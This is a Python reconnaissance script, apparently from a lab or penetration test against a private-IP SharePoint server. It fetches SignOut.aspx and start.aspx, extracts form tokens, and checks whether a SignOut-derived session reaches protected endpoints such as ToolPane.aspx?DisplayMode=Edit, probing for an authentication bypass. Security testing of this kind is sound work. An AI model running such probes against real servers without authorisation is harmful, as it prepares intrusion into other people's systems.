# Purpose: Investigate accessible endpoints for auth bypass opportunities
# Outcome: Check if accessible endpoints can be leveraged for authentication

import requests

target_base = "http://10.10.10.166"

# First, get the full response from accessible endpoints
print("[*] Analyzing /_layouts/15/SignOut.aspx...")
r = requests.get(f"{target_base}/_layouts/15/SignOut.aspx", timeout=10)
print(f"Status: {r.status_code}")
print(f"Headers: {dict(r.headers)}")
print(f"Cookies: {dict(r.cookies)}")
print(f"Body (first 500 chars): {r.text[:500]}")

print("\n" + "="*50)
print("[*] Analyzing /_layouts/15/start.aspx...")
r = requests.get(f"{target_base}/_layouts/15/start.aspx", timeout=10)
print(f"Status: {r.status_code}")
print(f"Headers: {dict(r.headers)}")
print(f"Cookies: {dict(r.cookies)}")
print(f"Body (first 500 chars): {r.text[:500]}")

# Check if there are any session tokens or form values we can extract
print("\n" + "="*50)
print("[*] Looking for VIEWSTATE and form tokens in SignOut.aspx...")
import re
r = requests.get(f"{target_base}/_layouts/15/SignOut.aspx", timeout=10)
viewstate = re.findall(r'__VIEWSTATE[^"]*value="([^"]*)"', r.text)
eventvalidation = re.findall(r'__EVENTVALIDATION[^"]*value="([^"]*)"', r.text)
requestdigest = re.findall(r'__REQUESTDIGEST[^"]*value="([^"]*)"', r.text)
print(f"VIEWSTATE found: {bool(viewstate)}")
print(f"EVENTVALIDATION found: {bool(eventvalidation)}")
print(f"REQUESTDIGEST found: {bool(requestdigest)}")

# Test if we can use cookies/tokens from SignOut page to access protected endpoints
print("\n" + "="*50)
print("[*] Testing if SignOut.aspx session can access protected endpoints...")
session = requests.Session()
session.get(f"{target_base}/_layouts/15/SignOut.aspx", timeout=10)
print(f"Session cookies after SignOut: {dict(session.cookies)}")

# Try to access protected endpoint with session
r = session.get(f"{target_base}/_layouts/15/ToolPane.aspx?DisplayMode=Edit", timeout=10, allow_redirects=False)
print(f"Access to ToolPane.aspx with session: {r.status_code}")

r = session.get(f"{target_base}/_api/web/currentuser", timeout=10, allow_redirects=False)
print(f"Access to /_api/web/currentuser with session: {r.status_code}")

print("\n[*] Accessible endpoint analysis complete")
